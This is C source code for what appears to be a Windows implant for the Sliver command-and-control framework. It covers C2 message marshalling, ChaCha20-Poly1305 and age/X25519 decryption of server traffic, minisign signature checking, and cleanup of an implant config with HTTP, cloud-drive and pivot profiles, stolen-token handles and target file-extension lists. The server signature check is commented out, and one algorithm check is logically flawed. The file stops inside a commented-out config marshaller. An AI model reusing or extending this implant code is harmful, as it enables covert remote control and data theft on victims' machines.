#include "pch.h"

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	if (pEnvelope != NULL) {
		if (pEnvelope->pData != NULL) {
			FREE(pEnvelope->pData->pBuffer);
			FREE(pEnvelope->pData);
		}

		FREE(pEnvelope);
	}
}

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
)
{
	if (pSliverPool != NULL) {
		if (pSliverPool->pPool != NULL) {
			TpReleasePool(pSliverPool->pPool);
		}

		FREE(pSliverPool);
	}
}

PSLIVER_THREADPOOL InitializeSliverThreadPool(VOID)
{
	PSLIVER_THREADPOOL pResult = NULL;
	PTP_CLEANUP_GROUP pCleanupGroup = NULL;

	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
	pResult->pPool = CreateThreadpool(NULL);
	TpSetPoolMaxThreads(pResult->pPool, 8);
	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
	pCleanupGroup = CreateThreadpoolCleanupGroup();
	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);

	return pResult;
}

VOID FreeGlobalConfig
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	DWORD i = 0;

	if (pConfig != NULL) {
		FREE(pConfig->pSessionKey);
		FREE(pConfig->pPeerSessionKey);
		FREE(pConfig->lpRecipientPubKey);
		FREE(pConfig->lpPeerPubKey);
		FREE(pConfig->lpPeerPrivKey);
		FREE(pConfig->lpConfigID);
		FREE(pConfig->lpServerMinisignPublicKey);
		FREE(pConfig->lpPeerAgePublicKeySignature);
		FREE(pConfig->lpSliverPath);
		FREE(pConfig->lpMainExecutable);
		FREE(pConfig->lpSliverName);
		FREE(pConfig->lpUniqueName);
		FREE(pConfig->lpProxy);
		if (pConfig->hMutex != NULL) {
			CloseHandle(pConfig->hMutex);
		}

		if (pConfig->HttpProfiles != NULL) {
			for (i = 0; i < pConfig->cHttpProfiles; i++) {
				FreeHttpProfile(pConfig->HttpProfiles[i]);
			}

			FREE(pConfig->HttpProfiles);
		}

		if (pConfig->DriveProfiles != NULL) {
			for (i = 0; i < pConfig->cDriveProfiles; i++) {
				FreeDriveProfile(pConfig->DriveProfiles[i]);
			}

			FREE(pConfig->DriveProfiles);
		}

		if (pConfig->PivotProfiles != NULL) {
			for (i = 0; i < pConfig->cPivotProfiles; i++) {
				FreePivotProfile(pConfig->PivotProfiles[i]);
			}

			FREE(pConfig->PivotProfiles);
		}

		if (pConfig->hCurrentToken != NULL) {
			CloseHandle(pConfig->hCurrentToken);
		}
		
		if (pConfig->DocumentExtensions != NULL) {
			for (i = 0; i < pConfig->cDocumentExtensions; i++) {
				FREE(pConfig->DocumentExtensions[i]);
			}

			FREE(pConfig->DocumentExtensions);
		}

		if (pConfig->ArchiveExtensions != NULL) {
			for (i = 0; i < pConfig->cArchiveExtensions; i++) {
				FREE(pConfig->ArchiveExtensions[i]);
			}

			FREE(pConfig->ArchiveExtensions);
		}
		
		/*if (pConfig->MonitoredFolder != NULL) {
			for (i = 0; i < pConfig->dwNumberOfMonitoredFolder; i++) {
				FREE(pConfig->MonitoredFolder[i]);
			}

			FREE(pConfig->MonitoredFolder);
		}*/

		/*if (pConfig->hDevNotify != NULL) {
			UnregisterDeviceNotification(pConfig->hDevNotify);
		}*/
		
		FREE(pConfig);
	}
}

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PBUFFER pResult = NULL;
	PPBElement pTemp = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	if (pEnvelope == NULL) {
		return NULL;
	}

	if (pEnvelope->uID != 0) {
		ElementList[0] = CreateVarIntElement(pEnvelope->uID, 1);
	}

	if (pEnvelope->uType > 0) {
		ElementList[1] = CreateVarIntElement(pEnvelope->uType, 2);
	}

	if (!pEnvelope->uUnknownMessageType) {
		if (pEnvelope->pData != NULL) {
			ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
		}
	}
	else {
		ElementList[3] = CreateVarIntElement(TRUE, 4);
	}

	pResult = ALLOC(sizeof(BUFFER));
	pTemp = CreateStructElement(ElementList, 4, 0);
	if (pTemp->SubElements != NULL) {
		for (i = 0; i < pTemp->dwNumberOfSubElement; i++) {
			FreeElement(pTemp->SubElements[i]);
		}

		FREE(pTemp->SubElements);
	}

	pResult = BufferMove(pTemp->pMarshaledData, pTemp->cbMarshaledData);
	pTemp->pMarshaledData = NULL;
	FreeElement(pTemp);
	return pResult;
}

PENVELOPE UnmarshalEnvelope
(
	_In_ PBUFFER pData
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pData->pBuffer, pData->cbBuffer, NULL);
	for (i = 0; i < _countof(ElementList); i++) {
		FREE(ElementList[i]);
	}

	return pResult;
}

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
)
{
	DWORD cbMarshaledFieldIdx = 0;
	PENVELOPE pResult = NULL;
	PPBElement RespElement;
	PPBElement FinalElement;
	PPBElement ElementList[4];

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(lpErrorDesc, lstrlenA(lpErrorDesc), 1);
	RespElement = CreateStructElement(ElementList, _countof(ElementList), dwFieldIdx);
	FinalElement = CreateStructElement(&RespElement, 1, 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->pData = BufferMove(FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
	FinalElement->pMarshaledData = NULL;
	pResult->uID = uEnvelopeID;
	
	FreeElement(ElementList[0]);
	FreeElement(FinalElement);

	return pResult;
}

//PBUFFER SliverBase64Decode
//(
//	_In_ LPSTR lpInput
//)
//{
//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
//	LPSTR lpTemp = NULL;
//	DWORD cbInput = lstrlenA(lpInput);
//	DWORD i = 0;
//	lpTemp = ALLOC(cbInput + 1);
//	DWORD dwPos = 0;
//	PBUFFER pResult = NULL;
//
//	for (i = 0; i < cbInput; i++) {
//		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
//		lpTemp[i] = szOldCharSet[dwPos];
//	}
//
//	pResult = ALLOC(sizeof(BUFFER));
//	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
//	FREE(lpTemp);
//	return pResult;
//}

PBUFFER SliverEncrypt
(
	_In_ PBYTE pSessionKey,
	_In_ PBUFFER pInput
)
{
	BYTE Nonce[CHACHA20_NONCE_SIZE];
	PBUFFER pResult = NULL;

	SecureZeroMemory(Nonce, sizeof(Nonce));
	pResult = ALLOC(sizeof(BUFFER));
	Chacha20Poly1305Encrypt(pSessionKey, Nonce, pInput->pBuffer, pInput->cbBuffer, NULL, 0, &pResult->pBuffer, &pResult->cbBuffer);
	pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + CHACHA20_NONCE_SIZE);
	memmove(pResult->pBuffer + CHACHA20_NONCE_SIZE, pResult->pBuffer, pResult->cbBuffer);
	memcpy(pResult->pBuffer, Nonce, CHACHA20_NONCE_SIZE);
	pResult->cbBuffer += CHACHA20_NONCE_SIZE;

	return pResult;
}

PBUFFER SliverDecrypt
(
	_In_ PBYTE pKey,
	_In_ PBUFFER pCipherText
)
{
	PBUFFER pResult = NULL;
	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
	PBYTE pTemp = NULL;
	PBYTE pNonce = NULL;
	DWORD cbCipherText = 0;
	BOOL IsOk = FALSE;
	PBYTE pSessionKey = NULL;

	/*if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
		goto CLEANUP;
	}

	pDecodedPubKey = DecodeMinisignPublicKey(pConfig->lpServerMinisignPublicKey);
	if (pDecodedPubKey == NULL) {
		goto CLEANUP;
	}

	pTemp = pCipherText->pBuffer;
	if (!VerifySign(pDecodedPubKey, pTemp, pCipherText->cbBuffer, FALSE)) {
		goto CLEANUP;
	}

	pNonce = pTemp + MINISIGN_SIZE;*/
	pTemp = pCipherText->pBuffer;
	pNonce = pTemp;
	pTemp = pNonce + CHACHA20_NONCE_SIZE;
	//cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
	cbCipherText = pCipherText->cbBuffer - CHACHA20_NONCE_SIZE;
	pResult = Chacha20Poly1305DecryptAndVerify(pKey, pNonce, pTemp, cbCipherText, NULL, 0);
	if (pResult == NULL || pResult->pBuffer == NULL || pResult->cbBuffer == 0) {
		goto CLEANUP;
	}

	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		FreeBuffer(pResult);
		pResult = NULL;
	}

	//FREE(pDecodedPubKey);

	return pResult;
}

PSIGNATURE DecodeMinisignSignature
(
	_In_ LPSTR lpInput
)
{
	LPSTR* SplitArray = NULL;
	DWORD cSplitArray = 0;
	PSIGNATURE pResult = NULL;
	PBUFFER pBuffer1 = NULL;
	PBUFFER pBuffer2 = NULL;

	SplitArray = StrSplitNA(lpInput, "\n", 0, &cSplitArray);
	if (cSplitArray < 4) {
		goto CLEANUP;
	}

	pBuffer1 = Base64Decode(SplitArray[1]);
	if (pBuffer1->cbBuffer != 74) {
		goto CLEANUP;
	}

	pBuffer2 = Base64Decode(SplitArray[3]);
	if (pBuffer2->cbBuffer != 64) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(SIGNATURE));
	pResult->lpUntrustedComment = SplitArray[0];
	pResult->lpTrustedComment = SplitArray[2];
	
	memcpy(pResult->SignatureAlgorithm, pBuffer1->pBuffer, pBuffer1->cbBuffer);
	memcpy(pResult->GlobalSignature, pBuffer2->pBuffer, pBuffer2->cbBuffer);
CLEANUP:
	FREE(SplitArray[1]);
	FREE(SplitArray[3]);
	FREE(SplitArray);
	FreeBuffer(pBuffer1);
	FreeBuffer(pBuffer2);

	return pResult;
}

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPublicKey,
	_In_ PSIGNATURE pSig,
	_In_ PBUFFER pMessage
)
{
	BOOL Result = FALSE;
	BOOL PreHashed = FALSE;
	PBYTE pBlake2Digest = NULL;
	PBYTE pTemp = NULL;
	DWORD cbTemp = 0;

	if (pPublicKey->SignatureAlgorithm[0] != 'E' && pPublicKey->SignatureAlgorithm[1] != 'd') {
		goto CLEANUP;
	}

	if (pSig->SignatureAlgorithm[0] == 0x45 && pSig->SignatureAlgorithm[1] == 0x64) {
		PreHashed = FALSE;
	}
	else if (pSig->SignatureAlgorithm[0] == 0x45 && pSig->SignatureAlgorithm[1] == 0x44) {
		PreHashed = TRUE;
	}
	else {
		goto CLEANUP;
	}

	if (memcmp(pPublicKey->KeyId, pSig->KeyId, sizeof(pPublicKey->KeyId))) {
		goto CLEANUP;
	}

	if (!IsStrStartsWithA(pSig->lpTrustedComment, "trusted comment: ")) {
		goto CLEANUP;
	}

	if (PreHashed) {
		pBlake2Digest = Blake2B(pMessage->pBuffer, pMessage->cbBuffer, NULL, 0);
		Result = ED25519Verify(pSig->Signature, pBlake2Digest, 64, pPublicKey->PublicKey);
	}
	else {
		Result = ED25519Verify(pSig->Signature, pMessage->pBuffer, pMessage->cbBuffer, pPublicKey->PublicKey);
	}

	if (!Result) {
		goto CLEANUP;
	}

	cbTemp = sizeof(pSig->Signature) + lstrlenA(pSig->lpTrustedComment) - 17;
	pTemp = ALLOC(cbTemp);
	memcpy(pTemp, pSig->Signature, sizeof(pSig->Signature));
	memcpy(pTemp + sizeof(pSig->Signature), &pSig->lpTrustedComment[17], cbTemp - sizeof(pSig->Signature));
	Result = ED25519Verify(pSig->GlobalSignature, pTemp, cbTemp, pPublicKey->PublicKey);
CLEANUP:
	FREE(pTemp);
	FREE(pBlake2Digest);

	return Result;
}

BOOL MinisignVerify
(
	_In_ PBUFFER pMessage,
	_In_ LPSTR lpSignature,
	_In_ LPSTR lpMinisignServerPublicKey
)
{
	PMINISIGN_PUB_KEY pServerPubKey = NULL;
	BOOL Result = FALSE;
	PSIGNATURE pSig = NULL;

	pServerPubKey = DecodeMinisignPublicKey(lpMinisignServerPublicKey);
	if (pServerPubKey == NULL) {
		goto CLEANUP;
	}

	pSig = DecodeMinisignSignature(lpSignature);
	if (pSig == NULL) {
		goto CLEANUP;
	}

	Result = VerifySign(pServerPubKey, pSig, pMessage);
CLEANUP:
	FREE(pServerPubKey);
	if (pSig != NULL) {
		FREE(pSig->lpTrustedComment);
		FREE(pSig->lpUntrustedComment);
		FREE(pSig);
	}

	return Result;
}

PX25519_IDENTITY AgeParseX25519Identity
(
	_In_ LPSTR lpRecipientPrivateKey
)
{
	CHAR szHrp[0x20];
	PBYTE pDecodedKey = NULL;
	DWORD cbDecodedKey = 0;
	PX25519_IDENTITY pResult = NULL;
	BYTE BasePoint[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	PBYTE pOurPubKey = NULL;

	SecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pDecodedKey, &cbDecodedKey, lpRecipientPrivateKey);
	if (lstrcmpA(szHrp, "age-secret-key-")) {
		goto CLEANUP;
	}

	if (cbDecodedKey != X25519_SCALAR_SIZE) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(X25519_IDENTITY));
	pResult->pOurPublicKey = ALLOC(X25519_SHARED_SIZE);
	pResult->pSecretKey = pDecodedKey;
	ComputeX25519(pResult->pOurPublicKey, pDecodedKey, BasePoint);
	pDecodedKey = NULL;
CLEANUP:
	return pResult;
}

PSTANZA_WRAPPER ParseStanza
(
	_In_ PBYTE pInputBuffer,
	_In_ DWORD cbBuffer
)
{
	BOOL IsOk = TRUE;
	PSTANZA_WRAPPER pResult = NULL;
	DWORD dwPos = 0;
	CHAR szLine[0x400];
	DWORD cchLine = 0;
	LPSTR lpTemp = NULL;
	CHAR szFooterPrefix[] = "---";
	CHAR szStanzaPrefix[] = "->";
	DWORD dwArgc = 0;
	LPSTR* pArgs = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PSTANZA pStanza = NULL;
	PBUFFER pDecodedData = NULL;

	lpTemp = StrChrA(pInputBuffer, '\n');
	dwPos = (UINT64)lpTemp - (UINT64)pInputBuffer + 1;
	memcpy(szLine, pInputBuffer, dwPos);
	szLine[dwPos] = '\0';
	if (lstrcmpA(szLine, "age-encryption.org/v1\n")) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(STANZA_WRAPPER));
	while (TRUE) {
		memcpy(szLine, pInputBuffer + dwPos, lstrlenA(szFooterPrefix));
		szLine[lstrlenA(szFooterPrefix)] = '\0';
		if (IsStrStartsWithA(szLine, szFooterPrefix)) {
			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
			cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
			memcpy(szLine, pInputBuffer + dwPos, cchLine);
			szLine[cchLine - 1] = '\0';
			dwPos += cchLine;

			pArgs = StrSplitNA(szLine, " ", 0, &dwArgc);
			if (lstrcmpA(pArgs[0], szFooterPrefix) || dwArgc != 2) {
				for (i = 0; i < dwArgc; i++) {
					FREE(pArgs[i]);
				}

				FREE(pArgs);
				IsOk = FALSE;
				goto CLEANUP;
			}

			pResult->pMac = Base64Decode(pArgs[1]);
			break;
		}

		lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
		cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
		memcpy(szLine, pInputBuffer + dwPos, cchLine);
		szLine[cchLine - 1] = '\0';
		dwPos += cchLine;
		if (!IsStrStartsWithA(szLine, szStanzaPrefix)) {
			IsOk = FALSE;
			goto CLEANUP;
		}

		pArgs = StrSplitNA(szLine, " ", 0, &dwArgc);
		if (lstrcmpA(pArgs[0], szStanzaPrefix) || dwArgc < 3) {
			for (i = 0; i < dwArgc; i++) {
				FREE(pArgs[i]);
			}

			FREE(pArgs);
			IsOk = FALSE;
			goto CLEANUP;
		}

		pStanza = ALLOC(sizeof(STANZA));
		pStanza->lpType = pArgs[1];
		pStanza->pArgs = ALLOC(sizeof(LPSTR) * (dwArgc - 2));
		pStanza->dwArgc = dwArgc - 2;
		for (i = 2; i < dwArgc; i++) {
			pStanza->pArgs[i - 2] = pArgs[i];
		}

		FREE(pArgs);
		while (TRUE) {
			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
			cchLine = (UINT64)lpTemp - (UINT64)pInputBuffer - dwPos + 1;
			memcpy(szLine, pInputBuffer + dwPos, cchLine);
			szLine[cchLine - 1] = '\0';
			dwPos += cchLine;

			pDecodedData = Base64Decode(szLine);
			if (pDecodedData == NULL || pDecodedData->cbBuffer > 48) {
				IsOk = FALSE;
				goto CLEANUP;
			}

			if (pStanza->pBody == NULL) {
				pStanza->pBody = ALLOC(pDecodedData->cbBuffer);
			}
			else {
				pStanza->pBody = REALLOC(pStanza->pBody, pStanza->cbBody + pDecodedData->cbBuffer);
			}

			memcpy(pStanza->pBody + pStanza->cbBody, pDecodedData->pBuffer, pDecodedData->cbBuffer);
			pStanza->cbBody += pDecodedData->cbBuffer;
			if (pDecodedData->cbBuffer < 48) {
				FreeBuffer(pDecodedData);
				break;
			}

			FreeBuffer(pDecodedData);
		}

		if (pResult->Recipients != NULL) {
			pResult->Recipients = REALLOC(pResult->Recipients, (pResult->cRecipients + 1) * sizeof(PSTANZA));
		}
		else {
			pResult->Recipients = ALLOC(sizeof(PSTANZA));
		}

		pResult->Recipients[pResult->cRecipients++] = pStanza;
	}

	pResult->pPayload = ALLOC(sizeof(BUFFER));
	pResult->pPayload->cbBuffer = cbBuffer - dwPos;
	pResult->pPayload->pBuffer = ALLOC(pResult->pPayload->cbBuffer);
	memcpy(pResult->pPayload->pBuffer, &pInputBuffer[dwPos], pResult->pPayload->cbBuffer);
CLEANUP:
	if (!IsOk && pResult != NULL) {
		FreeBuffer(pResult->pMac);
		if (pResult->Recipients != NULL) {
			for (i = 0; i < pResult->cRecipients; i++) {
				FreeStanza(pResult->Recipients[i]);
			}

			FREE(pResult->Recipients);
		}

		FREE(pResult);
		pResult = NULL;
	}

	return pResult;
}

PBYTE MarshalWithoutMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pHmacKey
)
{
	PBYTE pResult = NULL;
	CHAR szIntro[] = "age-encryption.org/v1\n";
	CHAR szStanzaPrefix[] = "->";
	LPSTR lpBuffer = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PSTANZA pRecipient = NULL;
	LPSTR pEncodedBody = NULL;

	lpBuffer = DuplicateStrA(szIntro, 0);
	for (i = 0; i < pHdr->cRecipients; i++) {
		pRecipient = pHdr->Recipients[i];
		lpBuffer = StrCatExA(lpBuffer, szStanzaPrefix);
		lpBuffer = StrCatExA(lpBuffer, " ");
		lpBuffer = StrCatExA(lpBuffer, pRecipient->lpType);
		for (j = 0; j < pRecipient->dwArgc; j++) {
			lpBuffer = StrCatExA(lpBuffer, " ");
			lpBuffer = StrCatExA(lpBuffer, pRecipient->pArgs[j]);
		}

		lpBuffer = StrCatExA(lpBuffer, "\n");
		pEncodedBody = Base64Encode(pRecipient->pBody, pRecipient->cbBody, TRUE);
		for (j = 0; j < lstrlenA(pEncodedBody) / 64; j++) {
			lpBuffer = REALLOC(lpBuffer, lstrlenA(lpBuffer) + 66);
			memcpy(lpBuffer + lstrlenA(lpBuffer), &pEncodedBody[j * 64], 64);
			lstrcatA(lpBuffer, "\n");
		}

		lpBuffer = StrCatExA(lpBuffer, &pEncodedBody[j * 64]);
		lpBuffer = StrCatExA(lpBuffer, "\n");
		FREE(pEncodedBody);
	}

	lpBuffer = StrCatExA(lpBuffer, "---");
	pResult = GenerateHmacSHA256(pHmacKey, SHA256_HASH_SIZE, lpBuffer, lstrlenA(lpBuffer));
CLEANUP:
	FREE(lpBuffer);

	return pResult;
}

PBYTE HeaderMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pFileKey,
	_In_ DWORD cbFileKey
)
{
	CHAR szInfo[] = "header";
	PBYTE pHmacKey = NULL;
	PBYTE pResult = NULL;

	pHmacKey = HKDFGenerate(NULL, 0, pFileKey, cbFileKey, szInfo, lstrlenA(szInfo), SHA256_HASH_SIZE);
	pResult = MarshalWithoutMAC(pHdr, pHmacKey);
	FREE(pHmacKey);

	return pResult;
}

PBUFFER AgeDecrypt
(
	_In_ LPSTR lpRecipientPrivateKey,
	_In_ PBUFFER pCipherText
)
{
	PBUFFER pResult = NULL;
	PX25519_IDENTITY pX25519Identity = NULL;
	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
	CHAR szInfo[] = "age-encryption.org/v1/X25519";
	CHAR szInfo2[] = "payload";
	PBYTE pTempBuffer = NULL;
	DWORD cbTempBuffer = 0;
	PSTANZA_WRAPPER pStanzaList = NULL;
	DWORD i = 0;
	DWORD j = 0;
	BYTE SharedSecret[X25519_SHARED_SIZE];
	PBUFFER pPublicKey = NULL;
	PSTANZA pStanza = NULL;
	PBYTE pSalt = NULL;
	PBYTE pWrappingKey = NULL;
	BYTE Chacha20Nonce[CHACHA20_NONCE_SIZE];
	BYTE HkdfSalt[16];
	PBUFFER pFileKey = NULL;
	PBYTE pMac = NULL;
	PBYTE pChacha20Key = NULL;

	SecureZeroMemory(SharedSecret, sizeof(SharedSecret));
	SecureZeroMemory(Chacha20Nonce, sizeof(Chacha20Nonce));
	if (pCipherText->cbBuffer < 24) {
		goto CLEANUP;
	}

	if (!IsStrStartsWithA(lpRecipientPrivateKey, "AGE-SECRET-KEY-1")) {
		goto CLEANUP;
	}

	pX25519Identity = AgeParseX25519Identity(lpRecipientPrivateKey);
	cbTempBuffer = lstrlenA(szAgeMsgPrefix) + pCipherText->cbBuffer;
	pTempBuffer = ALLOC(cbTempBuffer);
	lstrcpyA(pTempBuffer, szAgeMsgPrefix);
	memcpy(pTempBuffer + lstrlenA(szAgeMsgPrefix), pCipherText->pBuffer, pCipherText->cbBuffer);
	pStanzaList = ParseStanza(pTempBuffer, cbTempBuffer);
	if (pStanzaList == NULL || pStanzaList->cRecipients < 1) {
		goto CLEANUP;
	}

	pStanza = pStanzaList->Recipients[0];
	if (pStanza->dwArgc != 1) {
		goto CLEANUP;
	}

	pPublicKey = Base64Decode(pStanza->pArgs[0]);
	ComputeX25519(SharedSecret, pX25519Identity->pSecretKey, pPublicKey->pBuffer);
	pSalt = ALLOC(2 * X25519_KEY_SIZE);
	memcpy(pSalt, pPublicKey->pBuffer, X25519_KEY_SIZE);
	memcpy(pSalt + X25519_KEY_SIZE, pX25519Identity->pOurPublicKey, X25519_KEY_SIZE);
	pWrappingKey = HKDFGenerate(pSalt, 2 * X25519_KEY_SIZE, SharedSecret, sizeof(SharedSecret), szInfo, lstrlenA(szInfo), CHACHA20_KEY_SIZE);
	if (pWrappingKey == NULL) {
		goto CLEANUP;
	}

	pFileKey = Chacha20Poly1305DecryptAndVerify(pWrappingKey, Chacha20Nonce, pStanza->pBody, pStanza->cbBody, NULL, 0);
	pMac = HeaderMAC(pStanzaList, pFileKey->pBuffer, pFileKey->cbBuffer);
	if (pMac == NULL) {
		goto CLEANUP;
	}

	if (memcmp(pStanzaList->pMac->pBuffer, pMac, SHA256_HASH_SIZE)) {
		goto CLEANUP;
	}

	memcpy(HkdfSalt, pStanzaList->pPayload->pBuffer, sizeof(HkdfSalt));
	pChacha20Key = HKDFGenerate(HkdfSalt, sizeof(HkdfSalt), pFileKey->pBuffer, pFileKey->cbBuffer, szInfo2, lstrlenA(szInfo2), CHACHA20_KEY_SIZE);
	Chacha20Nonce[sizeof(Chacha20Nonce) - 1] = 1;
	pResult = Chacha20Poly1305DecryptAndVerify(pChacha20Key, Chacha20Nonce, pStanzaList->pPayload->pBuffer + sizeof(HkdfSalt), pStanzaList->pPayload->cbBuffer - sizeof(HkdfSalt), NULL, 0);
CLEANUP:
	if (pX25519Identity != NULL) {
		FREE(pX25519Identity->pOurPublicKey);
		FREE(pX25519Identity->pSecretKey);
		FREE(pX25519Identity);
	}

	if (pStanzaList != NULL) {
		FreeBuffer(pStanzaList->pMac);
		FreeBuffer(pStanzaList->pPayload);
		if (pStanzaList->Recipients != NULL) {
			for (i = 0; i < pStanzaList->cRecipients; i++) {
				FreeStanza(pStanzaList->Recipients[i]);
			}

			FREE(pStanzaList->Recipients);
		}

		FREE(pStanzaList);
	}

	FREE(pWrappingKey);
	FREE(pSalt);
	FreeBuffer(pFileKey);
	FREE(pTempBuffer);
	FREE(pMac);
	FREE(pChacha20Key);
	FreeBuffer(pPublicKey);

	return pResult;
}

UINT64 GeneratePeerID(VOID)
{
	UINT64 uResult = 0;
	PBYTE pRandomBytes = NULL;

	pRandomBytes = GenRandomBytes(sizeof(uResult));
	memcpy(&uResult, pRandomBytes, sizeof(uResult));
	FREE(pRandomBytes);

	return uResult;
}

//VOID MarshalConfig
//(
//	_In_ PGLOBAL_CONFIG pConfig
//)
//{
//	PPBElement ConfigElements[19];
//	PPBElement DriveElements[10];
//	PPBElement* DriveList = NULL;
//	PPBElement HttpElements[12];
//	PPBElement* HttpList = NULL;
//	PPBElement PivotElements[1];
//	PPBElement* PivotList = NULL;
//	PDRIVE_PROFILE pDriveProfile = NULL;
//	PHTTP_PROFILE pHttpProfile = NULL;
//	PPIVOT_PROFILE pPivotProfile = NULL;
//	PBUFFER* pBufferList = NULL;
//	DWORD i = 0;
//	DWORD j = 0;
//	PPBElement FinalElement = NULL;
//	LPSTR lpTemp = NULL;
//
//	ConfigElements[0] = CreateBytesElement(pConfig->lpRecipientPubKey, lstrlenA(pConfig->lpRecipientPubKey), 1);
//	ConfigElements[1] = CreateBytesElement(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey), 2);
//	ConfigElements[2] = CreateBytesElement(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey), 3);
//	ConfigElements[3] = CreateBytesElement(pConfig->lpServerMinisignPublicKey, lstrlenA(pConfig->lpServerMinisignPublicKey), 4);
//	ConfigElements[4] = CreateBytesElement(pConfig->lpSliverName, lstrlenA(pConfig->lpSliverName), 5);
//	ConfigElements[5] = CreateBytesElement(pConfig->lpConfigID, lstrlenA(pConfig->lpConfigID), 6);
//	ConfigElements[6] = CreateBytesElement(pConfig->lpPeerAgePublicKeySignature, lstrlenA(pConfig->lpPeerAgePublicKeySignature), 7);
//	ConfigElements[7] = CreateVarIntElement(pConfig->uEncoderNonce, 8);
//	ConfigElements[8] = CreateVarIntElement(pConfig->dwMaxConnectionErrors, 9);
//	ConfigElements[9] = CreateVarIntElement(pConfig->dwReconnectInterval, 10);
//	//ConfigElements[10] = CreateBytesElement(pConfig->lpSliverPath, lstrlenA(pConfig->lpSliverPath), 11);
//	ConfigElements[11] = CreateVarIntElement(pConfig->Protocol, 12);
//	ConfigElements[12] = CreateVarIntElement(pConfig->Type, 13);
//
//	if (pConfig->cDriveProfiles > 0) {
//		DriveList = ALLOC(sizeof(PPBElement) * pConfig->cDriveProfiles);
//		for (i = 0; i < pConfig->cDriveProfiles; i++) {
//			pDriveProfile = pConfig->DriveProfiles[i];
//			DriveElements[0] = CreateBytesElement(pDriveProfile->lpClientID, lstrlenA(pDriveProfile->lpClientID), 1);
//			DriveElements[1] = CreateBytesElement(pDriveProfile->lpClientSecret, lstrlenA(pDriveProfile->lpClientSecret), 2);
//			DriveElements[2] = CreateBytesElement(pDriveProfile->lpRefreshToken, lstrlenA(pDriveProfile->lpRefreshToken), 3);
//			DriveElements[3] = CreateBytesElement(pDriveProfile->lpUserAgent, lstrlenA(pDriveProfile->lpUserAgent), 4);
//			DriveElements[4] = CreateBytesElement(pDriveProfile->lpStartExtension, lstrlenA(pDriveProfile->lpStartExtension), 5);
//			DriveElements[5] = CreateBytesElement(pDriveProfile->lpRecvExtension, lstrlenA(pDriveProfile->lpRecvExtension), 6);
//			DriveElements[6] = CreateBytesElement(pDriveProfile->lpRegisterExtension, lstrlenA(pDriveProfile->lpRegisterExtension), 7);
//			DriveElements[7] = CreateBytesElement(pDriveProfile->lpRegisterExtension, lstrlenA(pDriveProfile->lpRegisterExtension), 8);
//			DriveElements[8] = CreateBytesElement(pDriveProfile->lpCloseExtension, lstrlenA(pDriveProfile->lpCloseExtension), 9);
//			DriveElements[9] = CreateVarIntElement(pDriveProfile->dwPollInterval, 10);
//			DriveList[i] = CreateStructElement(DriveElements, _countof(DriveElements), 0);
//		}
//
//		ConfigElements[13] = CreateRepeatedStructElement(DriveList, pConfig->cDriveProfiles, 14);
//		FREE(DriveList);
//	}
//
//	if (pConfig->cHttpProfiles > 0) {
//		HttpList = ALLOC(sizeof(PPBElement) * pConfig->cHttpProfiles);
//		for (i = 0; i < pConfig->cHttpProfiles; i++) {
